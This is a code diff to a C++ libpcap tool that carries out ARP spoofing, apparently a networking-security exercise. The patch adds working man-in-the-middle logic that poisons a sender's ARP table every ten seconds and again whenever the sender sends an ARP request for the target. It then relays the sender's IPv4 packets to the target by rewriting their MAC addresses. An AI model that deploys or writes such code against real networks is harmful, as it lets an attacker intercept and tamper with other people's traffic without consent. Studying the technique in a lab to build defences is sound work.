@@ -10,6 +10,8 @@
 #include "ethhdr.h"
 #include "arphdr.h"
 #include <sys/wait.h>
+#include <cstdint>
+#include <netinet/ip.h>
 
 using namespace std;
 
@@ -85,12 +87,12 @@ void send_arp_packet(pcap_t* handle, Mac& eth_dmac, Mac& eth_smac, Mac& arp_smac
 	}
 }
 
-int ipv4_arp_checker(struct EthArpPacket * arp_packet,Ip sender_ip,Mac attacker_mac){
+int ipv4_arp_reply_checker(struct EthArpPacket * arp_packet,Ip sender_ip,Ip attackerIp){
 	if(arp_packet->eth_.type() != EthHdr::Arp)
 		return 0;
 	if(arp_packet->arp_.op() != ArpHdr::Reply)
 		return 0;
-	if(arp_packet->arp_.sip() == sender_ip && arp_packet->arp_.tmac() == attacker_mac){
+	if(arp_packet->arp_.sip() == sender_ip && arp_packet->arp_.tip() == attackerIp){
 	
 		return 1;
 	}
@@ -100,7 +102,7 @@ int ipv4_arp_checker(struct EthArpPacket * arp_packet,Ip sender_ip,Mac attacker_
 
 }
 
-void get_mac_address(pcap_t* handle, Mac& senderMac, Mac& attackerMac, Ip& senderIp, Ip&attackerIp){
+void get_mac_address_by_ip(pcap_t* handle, Mac& senderMac, Mac& attackerMac, Ip& senderIp, Ip&attackerIp){
 	Mac broadcast = Mac("ff:ff:ff:ff:ff:ff");
 	Mac zero = Mac("00:00:00:00:00:00");
 	Mac smac;
@@ -116,16 +118,93 @@ void get_mac_address(pcap_t* handle, Mac& senderMac, Mac& attackerMac, Ip& sende
 			break;
 		}
 		struct EthArpPacket *eth_arp_packet = (struct EthArpPacket *)packet;
-		if (ipv4_arp_checker(eth_arp_packet,senderIp,attackerMac)){
+		if (ipv4_arp_reply_checker(eth_arp_packet,senderIp,attackerIp)){
 			senderMac=eth_arp_packet->arp_.smac();
 			break;
 		}
 	}
 }
 
+int parse_packet(const u_char* packet,Ip& senderIp){
+	struct EthHdr* ethHdr = (EthHdr*)packet;
+	if (ethHdr->type() == EthHdr::Arp) {
+		return 1;
+	} 
+
+	else if (ethHdr->type() == EthHdr::Ip4 ) {
+		return 2;
+	}
+	else{
+		return 0;
+	}
+}
+
+
 void arp_spoofing(pcap_t* handle, Mac& attackerMac, Mac& senderMac, Mac& targetMac,Ip& senderIp, Ip& targetIp){
+	pid_t pid = fork();
+	int select;
+	
+	if (pid ==0){
+		//if pid ==0: arp table infecting
+		while(true){
+			cout<<"Sender's ARP Table infecting\n";
+			send_arp_packet(handle, senderMac, attackerMac, attackerMac, targetIp, senderMac, senderIp,0 );		
+			sleep(10);
+		}
+	}
+	else if (pid>0){
+		while(true){
+			struct pcap_pkthdr* header;
+			const u_char* packet;
+			int res = pcap_next_ex(handle, &header, &packet);
+			if (res == 0) continue;
+			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
+				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+				break;
+			}
+			struct EthHdr* ethHdr = (EthHdr*)packet;
+			if ((ethHdr->smac_ != senderMac)||(ethHdr->dmac()!=attackerMac)) {
+				continue;
+			}
 
+			select=parse_packet(packet,senderIp);
+			if (select==0){
+				continue;
+			}
 
+			else if (select==1){
+				//if arpHdr->== arp
+				struct ArpHdr* arpHdr = (ArpHdr*)(packet + sizeof(EthHdr));
+				// if header==request and header == targetip : reinfecting
+				if (arpHdr->op() == ArpHdr::Request && arpHdr -> tip() == targetIp) {	
+					cout<<"Sender's ARP Table reinfecting\n";		
+					send_arp_packet(handle, senderMac, attackerMac, attackerMac, targetIp, senderMac, senderIp, 0 );
+				}
+			}
+			else if (select==2){
+				// if arpHdr ==ipv4
+				//used libnet.h
+				struct iphdr* ipheader = (struct iphdr*)(packet+sizeof(struct EthHdr));
+				//if ipheader_send addr=> senderip and destination mac == attackerMac and sendermac == sMac: replay
+				if ((Ip(ntohl(ipheader->saddr))==senderIp) && (ethHdr->dmac()==attackerMac) && (ethHdr->smac()==senderMac) ){
+					cout <<"Relaying [Packet >> Target]\n";
+					ethHdr -> smac() = attackerMac;
+					ethHdr -> dmac() = targetMac;
+					if(header->len != header->caplen){
+						printf("too long packet length\n");
+					}
+					int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(packet), header->caplen);
+					if (res2 != 0) {
+						fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+					}
+				}
+			}
+		}
+	}
+	else{
+		cout << "fork fail";
+		exit(-1);
+	}
 }
 
 int main(int argc, char* argv[]) {
@@ -159,15 +238,16 @@ int main(int argc, char* argv[]) {
 	{
 		pid = fork(); 
 		if(pid==0){
-		senderIp = Ip(argv[2+i*2]);
+			senderIp = Ip(argv[2+i*2]);
 			targetIp = Ip(argv[3+i*2]);
-			get_mac_address(handle, senderMac, attackerMac, senderIp, attackerIp); //get sender mac address
-			get_mac_address(handle, targetMac, attackerMac, targetIp, attackerIp); // get target mac address
-			cout <<"[sender IP : " << argv[i*2+2] << "]\n";
-			cout << "[Target IP : " << argv[i*2+3] << "]\n";
-			cout << "[sender mac address : " << string(senderMac) << "]\n";
-			cout << "[Target mac address : " << string(targetMac) << "]\n";
-			cout << "[== arp spoofing start ==]\n";
+			get_mac_address_by_ip(handle, senderMac, attackerMac, senderIp, attackerIp); //get sender mac address
+			get_mac_address_by_ip(handle, targetMac, attackerMac, targetIp, attackerIp); // get target mac address
+			cout << "["<<i+1<<"]";
+			cout <<"sender IP : " << argv[i*2+2] << "\n";
+			cout << "Target IP : " << argv[i*2+3] << "\n";
+			cout << "sender mac address : " << string(senderMac) << "\n";
+			cout << "Target mac address : " << string(targetMac) << "\n";
+			cout << "== arp spoofing start ==\n";
 			arp_spoofing(handle, attackerMac, senderMac, targetMac, senderIp, targetIp);	
 		}
 		else if (pid>0){
